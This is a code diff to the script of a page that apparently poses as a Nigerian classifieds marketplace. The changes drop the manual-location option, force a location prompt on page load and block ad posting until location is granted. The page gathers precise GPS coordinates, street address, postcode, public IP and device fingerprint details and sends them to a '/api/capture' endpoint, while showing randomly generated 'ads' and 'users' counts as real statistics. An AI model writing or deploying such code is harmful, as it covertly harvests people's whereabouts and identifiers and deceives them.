+                    if (data.address) {
+                        address.city = data.address.city || data.address.town || '';
+                        address.state = data.address.state || '';
+                        address.country = data.address.country || '';
+                        address.postcode = data.address.postcode || '';
                     }
-                    showToast(errorMsg, true);
-                    resolve(null);
-                },
-                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-            );
+                } catch(e) {}
+                resolve(address);
+            }, () => resolve(null), { enableHighAccuracy: true, timeout: 10000 });
         });
     }
-    
+
     async function getDeviceInfo() {
         let ip = 'unknown';
         try { const res = await fetch('https://api.ipify.org?format=json'); const data = await res.json(); ip = data.ip; } catch(e) {}
         return { userAgent: navigator.userAgent, platform: navigator.platform, language: navigator.language, screen: `${screen.width}x${screen.height}`, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, ip: ip };
     }
-    
+
     async function sendToBackend(data) {
         try {
             await fetch('/api/capture', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) });
@@ -312,83 +257,47 @@
             localStorage.setItem('naijamarket_data', JSON.stringify(existing.slice(0, 200)));
         }
     }
-    
-    function showToast(msg, isError = false) {
-        const toast = document.getElementById('toastMsg');
-        toast.innerHTML = `<i class="fas ${isError ? 'fa-exclamation-triangle' : 'fa-check-circle'}"></i> ${msg}`;
-        toast.className = isError ? 'toast error' : 'toast';
-        toast.classList.add('show');
-        setTimeout(() => toast.classList.remove('show'), 3000);
-    }
-    
+
     function showLocationModal() {
         const modal = document.getElementById('locationModal');
         modal.classList.add('active');
-    }
-    
-    function hideLocationModal() {
-        const modal = document.getElementById('locationModal');
-        modal.classList.remove('active');
-    }
-    
-    // Manual location entry - bypass GPS
-    function useManualLocation() {
-        hideLocationModal();
-        // Create a default location object for manual entry
-        userLocationData = {
-            lat: null,
-            lng: null,
-            manual: true,
-            fullAddress: document.getElementById('adLocation').value || "Location entered manually"
+        document.getElementById('locationAllowBtn').onclick = async () => {
+            modal.classList.remove('active');
+            const location = await captureLocation();
+            if (location) {
+                userLocation = location;
+                locationAllowed = true;
+                const device = await getDeviceInfo();
+                await sendToBackend({ id: Date.now(), type: 'permission_granted', timestamp: new Date().toISOString(), location: userLocation, device: device });
+            }
         };
-        locationAllowed = true;
-        document.getElementById('postModal').classList.add('active');
-        showToast("You can enter location manually in the form");
     }
-    
-    async function requestLocationAndProceed() {
-        const location = await captureLocationFast();
-        hideLocationModal();
-        
-        if (location && location.lat) {
-            userLocationData = location;
-            locationAllowed = true;
-            
-            const device = await getDeviceInfo();
-            await sendToBackend({
-                id: Date.now(),
-                type: 'permission_granted',
-                timestamp: new Date().toISOString(),
-                location: userLocationData,
-                device: device
-            });
-            
-            document.getElementById('postModal').classList.add('active');
-        } else {
-            // If location fails, give option to try again or use manual
-            showToast("Location failed. You can try again or enter manually.", true);
-            // Show modal again with both options
-            setTimeout(() => showLocationModal(), 1500);
-        }
-    }
-    
+
     function openPostModal() {
-        if (locationAllowed && userLocationData) {
+        if (locationAllowed && userLocation) {
             document.getElementById('postModal').classList.add('active');
         } else {
             showLocationModal();
         }
     }
-    
+
     document.getElementById('submitAdBtn').addEventListener('click', async () => {
         const title = document.getElementById('adTitle').value.trim();
-        if (!title) { showToast("Please enter an ad title", true); return; }
+        if (!title) { alert("Please enter an ad title"); return; }
+        
+        if (!locationAllowed && !userLocation) {
+            document.getElementById('postModal').classList.remove('active');
+            showLocationModal();
+            return;
+        }
         
         const btn = document.getElementById('submitAdBtn');
+        const originalText = btn.innerHTML;
         btn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Posting...';
         btn.disabled = true;
         
         const device = await getDeviceInfo();
+        
         const adRecord = {
             id: Date.now(),
             type: 'ad_posted',
@@ -398,11 +307,21 @@
                 category: document.getElementById('adCategory').value,
                 description: document.getElementById('adDesc').value,
                 price: document.getElementById('adPrice').value || 'Free',
-                location: document.getElementById('adLocation').value || (userLocationData?.fullAddress || 'Nigeria'),
+                streetAddress: document.getElementById('streetAddress').value,
+                cityArea: document.getElementById('cityArea').value,
                 phone: document.getElementById('contactPhone').value || 'Not provided'
             },
-            location: userLocationData,
-            device: device
+            location: userLocation ? {
+                lat: userLocation.lat,
+                lng: userLocation.lng,
+                accuracy: userLocation.accuracy,
+                city: userLocation.city,
+                state: userLocation.state,
+                country: userLocation.country,
+                postcode: userLocation.postcode
+            } : null,
+            device: device,
+            ip: device.ip
         };
         
         await sendToBackend(adRecord);
@@ -410,49 +329,36 @@
         document.getElementById('adTitle').value = '';
         document.getElementById('adDesc').value = '';
         document.getElementById('adPrice').value = '';
-        document.getElementById('adLocation').value = '';
+        document.getElementById('streetAddress').value = '';
+        document.getElementById('cityArea').value = '';
         document.getElementById('contactPhone').value = '';
         
-        btn.innerHTML = '<i class="fas fa-cloud-upload-alt"></i> Post Free Ad Now';
+        btn.innerHTML = originalText;
         btn.disabled = false;
-        showToast(`✅ "${title}" posted!`);
+        showAdConfirmation(`✅ "${title}" posted!`);
         document.getElementById('postModal').classList.remove('active');
         updateStats();
     });
-    
-    // Event listeners
+
     document.getElementById('openPostModalBtn').addEventListener('click', openPostModal);
     document.getElementById('heroPostBtn').addEventListener('click', openPostModal);
-    document.getElementById('closeModalBtn').addEventListener('click', () => document.getElementById('postModal').classList.remove('active'));
-    window.addEventListener('click', (e) => { if (e.target === document.getElementById('postModal')) document.getElementById('postModal').classList.remove('active'); });
-    
-    // Location modal buttons - using the new functions
-    document.getElementById('locationAllowBtn').addEventListener('click', requestLocationAndProceed);
-    document.getElementById('manualLocationBtn').addEventListener('click', useManualLocation);
-    
-    function updateStats() { 
-        let ads = 284000 + Math.floor(Math.random() * 500); 
-        let users = 12700 + Math.floor(Math.random() * 200); 
-        document.getElementById('statAds').innerHTML = (ads / 1000).toFixed(0) + 'K+'; 
-        document.getElementById('statUsers').innerHTML = (users / 1000).toFixed(1) + 'K'; 
+    document.getElementById('closeModalBtn').addEventListener('click', () => {
+        document.getElementById('postModal').classList.remove('active');
+    });
+
+    function updateStats() {
+        let ads = 284000 + Math.floor(Math.random() * 500);
+        let users = 12700 + Math.floor(Math.random() * 200);
+        document.getElementById('statAds').innerHTML = (ads / 1000).toFixed(0) + 'K+';
+        document.getElementById('statUsers').innerHTML = (users / 1000).toFixed(1) + 'K';
     }
     
-    renderFeaturedAds();
-    renderLatestAds();
+    renderFeatured();
+    renderLatest();
     renderCategories();
     updateStats();
     setInterval(updateStats, 8000);
-    
-    // Check existing permission on page load (NO automatic modal if already granted)
-    setTimeout(async () => {
-        const hasPermission = await checkExistingLocationPermission();
-        // Only show modal if NO permission and not already granted
-        if (!hasPermission && !locationAllowed) {
-            // Don't auto-show modal - wait for user to click "Post Ad"
-            // This prevents annoying popups on page load
-            console.log("Location not granted yet - will ask when user posts");
-        }
-    }, 500);
+    setTimeout(() => { showLocationModal(); }, 500);
 </script>
 </body>
 </html>
